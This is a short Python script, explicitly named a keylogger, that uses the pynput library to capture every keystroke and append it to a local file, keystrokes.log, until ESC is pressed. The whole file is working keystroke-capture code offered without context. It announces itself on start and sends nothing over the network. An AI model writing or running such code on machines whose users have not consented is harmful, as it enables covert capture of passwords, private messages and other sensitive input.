import pynput
from pynput.keyboard import Key, Listener

# Path
log_file = "keystrokes.log"

def on_press(key):
    try:
        # Write the pressed key to the log file
        with open(log_file, 'a') as f:
            f.write('{0} '.format(key))
    except Exception as e:
        print('Error logging key: ' + str(e))

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    start_keylogger()
